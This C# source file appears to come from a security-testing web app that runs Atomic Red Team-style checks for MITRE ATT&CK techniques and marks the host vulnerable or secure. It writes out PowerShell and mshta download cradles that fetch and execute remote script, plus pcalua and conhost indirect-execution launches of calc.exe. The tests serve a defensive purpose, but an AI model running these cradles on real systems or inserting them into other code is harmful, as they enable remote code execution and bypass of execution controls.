using System.Diagnostics;

namespace AttackOnDotnetMvcCore.Models
{
    public class Test
    {
        public int ID { get; set; }
        public int TechniqueID { get; set; }
        public string? SubTechniqueID { get; set; }
        public string? SubTechniqueName { get; set; }
        public string Name { get; set; }
        public int Number { get; set; }
        public int PlatformID { get; set; }
        public string? ShortDescription { get; set; }
        public string? LongDescription { get; set; }
        public string Url { get; set; }

        public enum TestResult
        {
            Vulnerable,
            Secure,
            TestFailed,
            NotImplemented
        }

        public static TestResult RunTest1059_001_8()
        {
            var p = new Process
            {
                StartInfo =
                 {
                     FileName = "powershell",
                     WorkingDirectory = "C:/",
                     CreateNoWindow = true,
                     Arguments = "-exec bypass -noprofile \"$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml');$Xml.command.a.execute | IEX\"",
                     UseShellExecute = false,
                     RedirectStandardOutput = true
                 }
            };
            p.Start();

            try
            {
                string output = p.StandardOutput.ReadLine();

                if (output != null && output.Contains("Download Cradle test success!"))
                {
                    return TestResult.Vulnerable;
                }
                else
                {
                    return TestResult.Secure;
                }
            }
            catch (Exception)
            {
                return TestResult.TestFailed;
            }
        }

        public static TestResult RunTest1059_001_9() 
        {
            var p = new Process
            {
                StartInfo =
                 {
                     FileName = "mshta.exe",
                     WorkingDirectory = "C:/",
                     CreateNoWindow = true,
                     Arguments = "javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()\"\r\n",
                     UseShellExecute = false,
                     RedirectStandardOutput = true
                 }
            };
            try
            {
                p.Start();
            }
            catch (Exception ex)
            {
                if (ex.Message.Contains("Access is denied"))
                {
                    return TestResult.Secure;
                }
            }

            try
            {
                string output = p.StandardOutput.ReadLine();

                if (output.Contains("Download Cradle test success!"))
                {
                    return TestResult.Vulnerable;
                }
                else
                {
                    return TestResult.Secure;
                }
            }
            catch (Exception)
            {
                return TestResult.TestFailed;
            }
        }

        public static TestResult RunTest1202_000_1()
        {
            var p = new Process
            {
                StartInfo =
                {
                     FileName = "powershell.exe",
                     WorkingDirectory = "C:/",
                     CreateNoWindow = true,
                     Arguments = "pcalua.exe -a calc.exe; echo vulnerable",
                     UseShellExecute = false,
                     RedirectStandardOutput = true,
                     RedirectStandardInput = true,
                }
            };
            try
            {
                p.Start();
            }
            catch (Exception ex)
            {
                if (ex.Message.Contains("Access is denied"))
                {
                    return TestResult.Secure;
                }
            }
            try
            {
                string output = p.StandardOutput.ReadLine();

                if (output.Contains("vulnerable"))
                {
                    return TestResult.Vulnerable;
                }
                else
                {
                    return TestResult.Secure;
                }
            }
            catch (Exception)
            {
                return TestResult.TestFailed;
            }
        }

        public static TestResult RunTest1202_000_3()
        {
            var p = new Process
            {
                StartInfo =
                {
                     FileName = "powershell.exe",
                     WorkingDirectory = "C:/",
                     CreateNoWindow = true,
                     Arguments = "conhost.exe calc.exe; echo vulnerable",
                     UseShellExecute = false,
                     RedirectStandardOutput = true,
                     RedirectStandardInput = true,
                }
            };
            try
            {
                p.Start();
            }
            catch (Exception ex)
            {
                if (ex.Message.Contains("Access is denied"))
                {
                    return TestResult.Secure;
                }
            }
            try
            {
                string output = p.StandardOutput.ReadLine();

                if (output.Contains("vulnerable"))
                {
                    return TestResult.Vulnerable;
                }
                else
                {
                    return TestResult.Secure;
                }
            }
            catch (Exception)
            {
                return TestResult.TestFailed;
            }
        }
        public static TestResult TestNotFound()
        {
            return TestResult.NotImplemented;
        }
    }
}
